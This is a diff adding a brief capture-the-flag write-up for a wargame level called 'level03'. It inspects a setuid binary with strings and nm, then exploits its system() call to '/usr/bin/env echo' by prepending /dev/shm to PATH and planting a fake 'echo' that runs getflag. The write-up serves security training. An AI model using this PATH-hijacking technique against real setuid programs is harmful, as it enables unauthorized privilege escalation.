@@ -1,0 +1,29 @@
+$> strings level03
+...
+/usr/bin/env echo Exploit me
+...
+$> nm -u level03
+[...]
+         U getegid@@GLIBC_2.0
+         U geteuid@@GLIBC_2.0
+         U setresgid@@GLIBC_2.0
+         U setresuid@@GLIBC_2.0
+         U system@@GLIBC_2.0
+[...]
+
+# Change UID during execution
+
+$> strings level03
+[...]
+/usr/bin/env echo %s
+[...]
+
+# Change `echo` binary to get the flag
+
+$> PATH=/dev/shm:$PATH
+
+$> echo "/bin/getflag" > /dev/shm/echo
+
+$> chmod +x /dev/shm/echo
+
+$> ./level03
